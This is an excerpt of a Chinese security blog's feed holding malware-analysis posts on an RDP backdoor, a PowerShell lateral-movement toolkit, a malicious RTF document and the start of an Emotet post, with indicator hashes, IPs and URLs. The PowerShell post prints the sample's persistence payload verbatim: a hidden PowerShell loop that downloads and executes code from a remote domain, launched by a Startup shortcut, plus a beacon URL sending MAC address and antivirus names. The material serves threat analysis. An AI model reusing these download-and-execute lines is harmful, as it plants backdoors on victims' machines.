alt="16"></p><p>将这些base64解密等处理后的文件为如下所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-17.png" alt="17"></p><p><strong>1.rdpclip.exe</strong> </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-18.png" alt="18"></p><p><strong>2.rdpwap.ini</strong> 目的就是开启rdp进行远控</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-19.png" alt="19"></p><p><strong>3.rfxvmt.dll</strong> </p><p>rdpclip.exe对于RDP会话中的文件复制和粘贴是必需的，而rfxvmt.dll对于Microsoft RemoteFX VM Transport是必需的，它为RDP添加了附加功能，例如访问物理图形处理单元（GPU）硬件加速</p><p>在计算机上搜索这两个文件，如果找不到，则恶意软件会将它们写入系统。此外，该恶意软件还会进行以下权限更改：</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-20.png" alt="20"></p><p>这些权限更改对于两个删除的DLL文件正常运行是必需的。</p><p>这以上三个文件<strong>与已知19年的APT组织TA505—–Hive0065</strong>   使用的方法相似</p><p><strong>4.reg</strong>注册表</p><p><strong>依旧可以看到 reg注册表、rdp.ini配置文件、DLL文件 均与这个 开源的rdpwrap项目相关</strong> </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-21.png" alt="21"></p><p><strong>5.mediasvc.png与mediasrv.png</strong></p><p>这两个则为后门通信程序</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-22.png" alt="22"></p><h4 id="4-部署"><a href="#4-部署" class="headerlink" title="4.部署"></a>4.部署</h4><p>而get-conten文件最后呢 对系统进行了一些配置修改</p><p><strong>1.修改远程端口7201,加载后门服务，开启远程，添加服务器</strong></p><p><strong>2.获得域管理员权限.</strong></p><p><strong>3.修改时间戳</strong></p><p><strong>4.添加rdp和终端服务</strong></p><p><strong>5.清理痕迹</strong></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-23.png" alt="23"></p><h3 id="4-IOC"><a href="#4-IOC" class="headerlink" title="4.IOC"></a>4.IOC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"> Main object - 12.bat </span><br><span class="line">    SHA256 77895769097f983c4137bbea5b87a685f2252994e3761ede65081e45d496177c </span><br><span class="line">    SHA1 8b9daf70dfbd04ecf3f98ef874392231d2ce1c70</span><br><span class="line">    MD5 ca9cc08a6f67e22bff228f7b862ba30e </span><br><span class="line"></span><br><span class="line">    mae.ps1 </span><br><span class="line">    SHA256 42C277ADA9C6F8DDCD6211E4792A8DF1FA0D0AD8CBB867EEE1A431CC1B79834D </span><br><span class="line">    SHA1 348909394CA5D1E605ECB20CFA95A1870F529669 </span><br><span class="line">    MD5 DBD0A5FB31FDF76CF0D7DFA2E67ADEB7 </span><br><span class="line"></span><br><span class="line">    start.vbs</span><br><span class="line">    SHA256 5D4A0661CFB3CCA59ACD8A9FA433EC2C48D686DA36F3890B73E7B9F37C60E980 </span><br><span class="line">    SHA1 57CED4325A4F1C93D6928E560E5C7209A4ED0282 </span><br><span class="line">    MD5 9E3905E054E78547EC4FBBBB73E92B78</span><br><span class="line"></span><br><span class="line">    ready.ps1</span><br><span class="line">    SHA256 586850ea99ba4844c0dde20b7260c4222c67e0ede021c5e1c1339e664b1ce191 </span><br><span class="line">    SHA1 17c7dd1b1e72c3fcdef91e9206f58406a98564e7 </span><br><span class="line">    MD5 18e76ebd0f8694e0f998443e5763ea8d</span><br><span class="line"></span><br><span class="line">    Get-Content.ps1</span><br><span class="line">    SHA256 E9E217E32B0F5963FD40CAFB1CE800907B7B06F8A0E960B62BFA41D37841DEAB </span><br><span class="line">    SHA1 B8C54D44DE03CFF2467FB504CD972D677C32AB25 </span><br><span class="line">    MD5 DED160C4F2409D48DA8FEAF0934D3F02</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Get-Content.ps1(malware-and-artifacts)</span><br><span class="line"></span><br><span class="line">MD5 (Rdpclip.exe) = 1690e3004f712c75a2c9ff6bcde49461</span><br><span class="line">MD5 (dgiusjeja64_mediasrv.png) = c13860727871a39063e0bb58117919ba</span><br><span class="line">MD5 (otiiahj64_mediasvc.png) = aa6bf98c9120b0539c0270a3e453ddf6</span><br><span class="line">MD5 (reg.reg) = 5a2f4e19ffc05366279f9341913722f1</span><br><span class="line">MD5 (rfxvmt.dll) = dc39d23e4c0e681fad7a3e1342a2843c</span><br><span class="line">MD5 (wupsvc.jpg_rdpwap.ini) = dc5b36b03764114c55cec484d975888a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Connections  </span><br><span class="line"> IP 94.158.245.88 </span><br><span class="line"> IP 5.181.156.3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/HTTPS requests  </span><br><span class="line"> URL http://94.158.245.88/mae/start.vbs </span><br><span class="line"> URL http://94.158.245.88/mae/Get-Content.ps1 </span><br><span class="line"> URL http://94.158.245.88/mae/ready.ps1</span><br></pre></td></tr></table></figure><h3 id="链接："><a href="#链接：" class="headerlink" title="链接："></a>链接：</h3><p><a href="https://github.com/stascorp/rdpwrap">https://github.com/stascorp/rdpwrap</a></p><p><a href="https://suid.ch/research/Telegram_Malware_Analysis.html">https://suid.ch/research/Telegram_Malware_Analysis.html</a></p><p><a href="https://www.joesandbox.com/analysis/370722/0/html">https://www.joesandbox.com/analysis/370722/0/html</a></p><p><a href="https://www.joesandbox.com/analysis/370720/0/html">https://www.joesandbox.com/analysis/370720/0/html</a></p><p><a href="https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/operation-ta505-part2/">https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/operation-ta505-part2/</a></p><p><a href="https://gist.github.com/gabemarshall/f25afd533b341e1b21bc39f8e26946b7">https://gist.github.com/gabemarshall/f25afd533b341e1b21bc39f8e26946b7</a></p><p><a href="https://www.binarydefense.com/an-updated-servhelper-tunnel-variant/">https://www.binarydefense.com/an-updated-servhelper-tunnel-variant/</a></p><p><a href="https://attack.mitre.org/groups/G0092/">https://attack.mitre.org/groups/G0092/</a></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> 恶意样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 恶意样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>powershell横向渗透样本分析</title>
      <link href="/powershell%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html"/>
      <url>/powershell%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20210309_193244.jpg" alt="enter description here"></p><span id="more"></span><h3 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h3><p>前段时间收到一份样本 类似于<strong>DLTMiner</strong>活动攻击留下的样本，这份样本与2019年<strong>DLTMiner</strong>及其相似,同时也与近期的<strong>exchange</strong>服务器相关</p><p>同时 Kyle Hanslovan在推文发布一张图，图中有powershell执行代码调用执行url地址的字符串</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-1.jpg" alt="1"></p><p>http[:]&#x2F;&#x2F;p。estonine。com&#x2F;p?e</p><p>调用执行的依旧为powershell的代码</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-2.png" alt="2"></p><h3 id="2-powershell混淆"><a href="#2-powershell混淆" class="headerlink" title="2.powershell混淆"></a>2.powershell混淆</h3><p> 解码powershell的混淆,去掉 IEX 或  Invoke-Expression  </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-3.png" alt="3"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-4.png" alt="4"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-5.png" alt="5"></p><h4 id="解码后"><a href="#解码后" class="headerlink" title="解码后"></a>解码后</h4><p>解出多次混淆后，下图为最后完整的代码</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-6.png" alt="6"></p><p>这里重点内容为 下载执行update。png的内容</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-7.png" alt="7"></p><h4 id="updata-png"><a href="#updata-png" class="headerlink" title="updata-png"></a>updata-png</h4><p>而update。png内容如下</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-8.png" alt="8"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-9.png" alt="9"></p><p>解码混淆两三次后如下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-10.png" alt="10"></p><p>下面重点开始讲这部分的脚本的功能。</p><h3 id="3-update-png的功能"><a href="#3-update-png的功能" class="headerlink" title="3.update-png的功能"></a>3.update-png的功能</h3><h4 id="3-1-永恒之蓝"><a href="#3-1-永恒之蓝" class="headerlink" title="3.1.永恒之蓝"></a>3.1.永恒之蓝</h4><p>加入了开源脚本的powershell exp</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-10.png" alt="10"></p><h4 id="3-2永恒之蓝扫描"><a href="#3-2永恒之蓝扫描" class="headerlink" title="3.2永恒之蓝扫描"></a>3.2永恒之蓝扫描</h4><p>加入了开源脚本ms17-010scanner.cs</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-11.png" alt="11"></p><h4 id="3-3-目标选择"><a href="#3-3-目标选择" class="headerlink" title="3.3 目标选择"></a>3.3 目标选择</h4><p>随机生成用于定位的IP地址，并在特定端口号上进行端口扫描以侦听服务，例如445 &#x2F; TCP（SMB），1433 &#x2F; TCP（MS-SQL服务器）或65529 &#x2F; TCP（先前已被该威胁参与者破坏的计算机）。</p><p>脚本从远程计算机获得响应后，它将探测EternalBlue SMB漏洞的IP地址，或对MS-SQL服务执行暴力攻击，以试图破坏计算机。带有此侦听端口的计算机在65529 &#x2F; TCP上打开，之前，该计算机或其他威胁因素已使用类似的脚本破坏了该计算机</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-12.png" alt="12"></p><h4 id="3-4powerDump"><a href="#3-4powerDump" class="headerlink" title="3.4powerDump"></a>3.4powerDump</h4><p>使用powershell dump  从注册表中读取哈希值来执行哈希转储</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-13.png" alt="13"></p><h4 id="3-5mimikatz"><a href="#3-5mimikatz" class="headerlink" title="3.5mimikatz"></a>3.5mimikatz</h4><p>加入了开源脚本 将单文件载入mimikaze.DLL到powershell的内存中运行，分别为32位和64位的dll</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-14.png" alt="14"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-15.png" alt="15"></p><p>32bit - D58A41A393F4B9A406226689F29C7017CA20F788 </p><p>64bit - FA8E53CB3497CBF81CFEE0DDBF171DE98B83211D</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-16.png" alt="16"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-17.png" alt="17"></p><p>获取信息</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-24.png" alt="24"></p><h4 id="3-6TheHash"><a href="#3-6TheHash" class="headerlink" title="3.6TheHash"></a>3.6TheHash</h4><p>加入了开源脚本Invoke-TheHash包含用于执行传递哈希WMI和SMB任务的PowerShell函数</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-18.png" alt="18"></p><p>执行psexec</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-23.png" alt="23"></p><h4 id="3-7-RDP爆破"><a href="#3-7-RDP爆破" class="headerlink" title="3.7 RDP爆破"></a>3.7 RDP爆破</h4><p>脚本内嵌用户名字典和hash表和明文密码表<br>用户列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">administrator</span><br><span class="line">admin</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-19.png" alt="19"></p><h4 id="3-8-权限维持"><a href="#3-8-权限维持" class="headerlink" title="3.8 权限维持"></a>3.8 权限维持</h4><p>创建计划任务和防火墙 添加转发策略</p><p>上传文件到:                       </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\&lt;Name&gt;\AppData\Roaming\sign.txt 内容0:                        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\&lt;Name&gt;\AppData\Roaming\flashplayer.tmp 内容:try&#123;(new ActiveXObject(&quot;WScript.Shell&quot;)).Run(&quot;powershell -w hidden -ep bypass -c while($True)&#123;try&#123;IEX (New-Object Net.WebClient).downloadstring(&#x27;http://p.estonine.com/low?ipc&#x27;)&#125;catch&#123;Sleep -m 2500000&#125;&#125;&quot;,0,false);&#125;catch(e)&#123;&#125;                        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Users\&lt;Name&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\FlashPlayer.lnk 快捷方式指向的目标:C:\Windows\system32\wscript.exe //e:javascript &quot;%appdata%\flashplayer.tmp&quot;</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-21.png" alt="21"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-22.png" alt="22"></p><h3 id="4-执行过程"><a href="#4-执行过程" class="headerlink" title="4.执行过程"></a>4.执行过程</h3><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210309-25.png" alt="25"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">while(true)循环执行:</span><br><span class="line">    1.线程休眠200秒</span><br><span class="line">    2.创建名为Global\PSexec的互斥锁</span><br><span class="line">    3.获取第一张网卡的MAC地址</span><br><span class="line">    4.获取杀毒软件</span><br><span class="line">    5.如果存在杀毒 (条件判断)</span><br><span class="line">        True:$av变量为将杀毒名称以:&lt;name&gt;|&lt;name&gt;的格式拼接在一起，例如:Windows Defender|360安全卫士|</span><br><span class="line">        False:$av变量为空</span><br><span class="line"></span><br><span class="line">    6.拼接url格式:http://p.estonine.com/getnew.php?ver=2020&amp;mac=&lt;网卡mac地址&gt;&amp;re=&amp;pid=&lt;当前进程pid&gt;&amp;av=&lt;杀毒名称&gt;&amp;ver=&lt;系统版本&gt;&amp;bit=&lt;系统位数&gt;</span><br><span class="line">    7.从url请求对应的内容读取内容后将##替换为空base64解码执行下载的内容</span><br><span class="line">    8.调用localscan函数检查本地和内网445端口判断是否开启</span><br><span class="line">    9.调用localscan函数检查本地和内网65353端口判断是否开启</span><br><span class="line">    10.$Bserver数组不存在该IP调用copyrun函数</span><br><span class="line">        调用Invoke-SMBC函数hash传递攻击</span><br><span class="line">        传递成功:调用Invoke-SE函数hash传递攻击执行开启防火墙和设置计划任务，和上传文件到指定路径(如果源路径存在该文件则删除)</span><br><span class="line">        </span><br><span class="line">      创建计划任务和防火墙 添加转发策略</span><br><span class="line">      文件上传</span><br><span class="line"></span><br><span class="line">        传递失败:</span><br><span class="line">    11.MS17010扫描攻击</span><br><span class="line">    12.休眠100秒</span><br></pre></td></tr></table></figure><h3 id="5-IOC"><a href="#5-IOC" class="headerlink" title="5.IOC"></a>5.IOC</h3><p>此脚本结合了多种开源的powershell脚本形成了此内网横向渗透的工具集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Main object - &quot;update.png&quot;   </span><br><span class="line"></span><br><span class="line"> URL http://188.166.162.201/update.png</span><br><span class="line"> MD5 4dd2c9bfd0fc3ee162980af37ce1d2ec</span><br><span class="line"> </span><br><span class="line">DNS requests  </span><br><span class="line"></span><br><span class="line"> DOMAIN p.estonine.com </span><br><span class="line"> DOMAIN api.ipify.org </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Connections  </span><br><span class="line"></span><br><span class="line"> IP 188.166.162.7 </span><br><span class="line"> IP 188.166.162.201 </span><br><span class="line"> IP 188.166.162.2 </span><br><span class="line"> IP 188.166.162.3</span><br><span class="line"> ..........</span><br></pre></td></tr></table></figure><p>链接：</p><p><a href="https://app.any.run/tasks/91d52b22-d87f-4a7e-bd3a-22c48525df6d/">https://app.any.run/tasks/91d52b22-d87f-4a7e-bd3a-22c48525df6d/</a></p><p><a href="https://422926799.github.io/posts/855d1ef5.html">https://422926799.github.io/posts/855d1ef5.html</a></p><p><a href="https://github.com/tevora-threat/eternal_blue_powershell/blob/master/EternalBlue.ps1">https://github.com/tevora-threat/eternal_blue_powershell/blob/master/EternalBlue.ps1</a></p><p><a href="https://github.com/vletoux/pingcastle/blob/master/Scanners/ms17_010scanner.cs">https://github.com/vletoux/pingcastle/blob/master/Scanners/ms17_010scanner.cs</a></p><p><a href="https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/">https://news.sophos.com/en-us/2019/10/01/lemon_duck-powershell-malware-cryptojacks-enterprise-networks/</a></p><p><a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1">https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1</a></p><p><a href="https://gist.githubusercontent.com/DShankle/825a976504df012d7ce465f10eaaa728/raw/603c3de11c264c0aa94e03980b8ac12bc6cda29c/gistfile1.txt">https://gist.githubusercontent.com/DShankle/825a976504df012d7ce465f10eaaa728/raw/603c3de11c264c0aa94e03980b8ac12bc6cda29c/gistfile1.txt</a></p><p><a href="https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBClient.ps1">https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBClient.ps1</a></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> 恶意样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 恶意样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rtf恶意样本静态分析</title>
      <link href="/rtf%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90.html"/>
      <url>/rtf%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/WechatIMG9.jpeg" alt="enter description here"></p><span id="more"></span><h2 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h2><p>前几天一位推友发布推文一个恶意样本弹框 大概意思是不能在any run 沙箱中运行</p><p>   <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-2.png" alt="2"></p><p>结果推友当时就在any run 沙箱上传运行。也是比较有意思的样本</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-1.png" alt="1"></p><h2 id="2-样本分析"><a href="#2-样本分析" class="headerlink" title="2.样本分析"></a>2.样本分析</h2><p>既然这么搞笑，就我们一起来分析这个恶意样本吧</p><p>本文从静态的角度分析样本。</p><p>首先我们考虑使用010编辑器查看，结果发现为rtf的文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-18.png" alt="20201-01-29-18"></p><p>那么我们这里使用oletools 套件中个的rtfobj查看，结果发现它中包含vbs文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-5.png" alt="20201-01-29-5"></p><p>那么我们对其进行dump下来vbs文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-3.png" alt="3"></p><h2 id="3-VBS混淆"><a href="#3-VBS混淆" class="headerlink" title="3.VBS混淆"></a>3.VBS混淆</h2><p>下面我们来分析vbs的内容，由于代码过于冗长，不便截图，我这里就挑重点讲。</p><p>下图我们可以看到vbs代码中一个红框包含了字符串的内容为powershell，第二个红框也是为powershell的代码，其中vbs对其进行拼接、替换字符串、以及字符串倒序。 </p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-4.png" alt="4"></p><p>那么我们重新整理vbs的代码对其进行输出到控制台</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-6.png" alt="20201-01-29-6"></p><p>这里我们调用cscript 执行我们重新整理好的vbs，结果完整的powershell代码就输出出来了。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-7.png" alt="5"></p><h2 id="4-powershell混淆-一"><a href="#4-powershell混淆-一" class="headerlink" title="4.powershell混淆(一)"></a>4.powershell混淆(一)</h2><p>我们可以看到该powershell的内容为混淆，但是我们可以对其进行解码混淆就是，去掉最后面的 I’E’X字符串</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-8.png" alt="20201-01-29-8"></p><p>那么我们重新整理之后的代码为下图输出后的内容</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-19.png" alt="20201-01-29-19"></p><p>下面我们来分析解码混淆后的代码，第一行代码为字符串拼接，为第一个红框注释的内容，为bypass asmi，第二个红框为下载执行base64加密的文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-9.png" alt="20201-01-29-9"></p><p>下图为base64的文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-10.png" alt="20201-01-29-10"></p><h2 id="5-powershell混淆-二"><a href="#5-powershell混淆-二" class="headerlink" title="5.powershell混淆(二)"></a>5.powershell混淆(二)</h2><p>我们对其进行解码后，为下图代码</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-11.png" alt="20201-01-29-11"></p><p>由于代码过于冗长我们挑几个重点讲解，我们看到下图中的红框1f,8b开头的数据 为gzip</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-12.png" alt="20201-01-29-12"></p><p>而下图 4d，5a开头的数据为我们熟悉PE文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-13.png" alt="20201-01-29-13"></p><p>下图为分离后的文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-14.png" alt="20201-01-29-14"></p><p>同时我们也对其进行解压，发现解压后的文件也是exe&#x2F;dll文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-15.png" alt="20201-01-29-15"></p><p>下图为在010编辑器中的内容</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-16.png" alt="20201-01-29-16"></p><p>下图为在powershell中我们第二个红框的pe文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-17.png" alt="20201-01-29-17"></p><p>所以最终的文件为，一个c#编写的dll，和一个exe文件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-21.png" alt="20201-01-29-21"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-22.png" alt="20201-01-29-22"></p><p>我没有对其进行下一步的分析，因为也超出本文的含义分析范畴。大体可以猜测为后门文件。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-23.png" alt="20201-01-29-23"></p><p>最后在powershell的代码中我们，调用control.exe运行第二个exe，为bypass applocker的行为方式。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20201-01-29-20.png" alt="20201-01-29-20"></p><p>总体来说该powershell代码具体的内容如下：</p><p>1.bypass asmi</p><p>2.下载解码执行base64文件</p><p>3.解码后释放两个后门文件</p><p>4.bypass applocker</p><h2 id="6-IOC"><a href="#6-IOC" class="headerlink" title="6.IOC"></a>6.IOC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">MALWARE INFO</span><br><span class="line"></span><br><span class="line">- MD5: a649a8b1d9cb4bef0acadabc2b1fa864</span><br><span class="line">- File name: invoice.doc</span><br><span class="line">- File description: rtf</span><br><span class="line"></span><br><span class="line">- MD5: 00fa1544790efd966a7b3e74922e3ded</span><br><span class="line">- File location:  C:\\fakepath\\Client.vbs</span><br><span class="line">- File name: Client.vbs</span><br><span class="line">- File description: vbs混淆包含powershell代码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- MD5: d72dd093179e5d87ff7b78e34be5356e</span><br><span class="line">- File name: fine_base64.jpg</span><br><span class="line">- File location：http://108.61.166.11/m/fine.jpg</span><br><span class="line">- File description: base64加密的powershell代码</span><br><span class="line"></span><br><span class="line">- MD5: 5bc66dba582e2f787ba8a154ba731123</span><br><span class="line">- File name: MALWARE.gz</span><br><span class="line">- File description: gzip压缩包包含MALWARE.DLL</span><br><span class="line"></span><br><span class="line">- MD5: 9f0fd70fad2d371b74dab910e3f4ff92</span><br><span class="line">- File name: msbuild.DLL</span><br><span class="line"></span><br><span class="line">- MD5: 10ae54ef15948d730a7f73813a228adf</span><br><span class="line">- File name: MALWARE.exe</span><br><span class="line">- File description: jpg文件释放</span><br><span class="line"></span><br><span class="line">Connections </span><br><span class="line"> IP 108.61.166.11 </span><br><span class="line"> </span><br><span class="line">HTTP/HTTPS 请求  </span><br><span class="line"> URL http://108.61.166.11/m/fine.jpg</span><br></pre></td></tr></table></figure><h1 id="链接："><a href="#链接：" class="headerlink" title="链接："></a>链接：</h1><p><a href="https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/">https://app.any.run/tasks/9f3895b5-6ae1-4ac1-b829-b50202985e3d/</a></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> 恶意样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 恶意样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分辨Emotet银行木马感染流量</title>
      <link href="/%E5%88%86%E8%BE%A8Emotet%E6%84%9F%E6%9F%93%E6%B5%81%E9%87%8F.html"/>
      <url>/%E5%88%86%E8%BE%A8Emotet%E6%84%9F%E6%9F%93%E6%B5%81%E9%87%8F.html</url>
      
